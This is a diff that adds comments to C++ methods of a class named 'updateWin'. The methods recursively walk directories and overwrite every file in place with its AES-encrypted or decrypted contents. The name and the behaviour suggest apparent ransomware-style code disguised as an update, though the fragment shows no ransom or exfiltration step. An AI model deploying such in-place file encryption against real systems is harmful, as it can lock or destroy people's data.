@@ -201,38 +201,53 @@ void updateWin::decrypt(std::vector<std::string> paths, std::vector<unsigned cha
             }
             else {
 
+		// Opening the file for reading the binaries
                 freader.open(Q_paths.front(), std::ios_base::binary);
 
+		// Creating a vector to store the data and storing the data inside
                 std::vector<unsigned char> buffer(std::istreambuf_iterator<char>(freader), {});
 
+	 	// Closing the file to not cause a conflict when creating a reader
                 freader.close();
 
+		// Decrypting the data
                 decryptedData = AES->AES_Decrypt(buffer, key);
 
+		// Opening the file for writing the decrypted data inside, writing the data and cloning the file
                 fwriter.open(Q_paths.front(), std::ios_base::binary);
                 fwriter << decryptedData;
                 fwriter.close();
             }
         }
     }
+    // Deleting the AES variable to free memory
     delete AES;
 }
 
 void updateWin::encrypt(std::vector<std::string> paths, std::vector<unsigned char> key)
 {
+    // Creating the file reader/writer, the AES variable for encrypting/
+    // creating a string to store the encrypted data inside and creating a qeueu
+    // to store the sub-directories inside
     std::ofstream fwriter;
     std::ifstream freader;
     AES128* AES = new AES128();
     std::string encryptedData;
     std::queue<std::filesystem::path> Q_paths;
 
+    // Scanning the vector for all the paths
     for (std::vector<std::string>::iterator it = paths.begin(); it < paths.end(); it++) {
 
+	// Adding the first path to the queue to start scanning
         Q_paths.push(*it);
 
+	// Scanning the queue for all the sub-directories
         while (!Q_paths.empty()) {
+	    // Checking if the path is a directory
             if (std::filesystem::is_directory(Q_paths.front())) {
+		// Scanning the path if its a directory
                 for (auto& dir : std::filesystem::directory_iterator(Q_paths.front())) {
+		    // Checking if the path is directory
                     if (!std::filesystem::is_directory(dir)) {
 
                         freader.open(dir.path(), std::ios_base::binary);
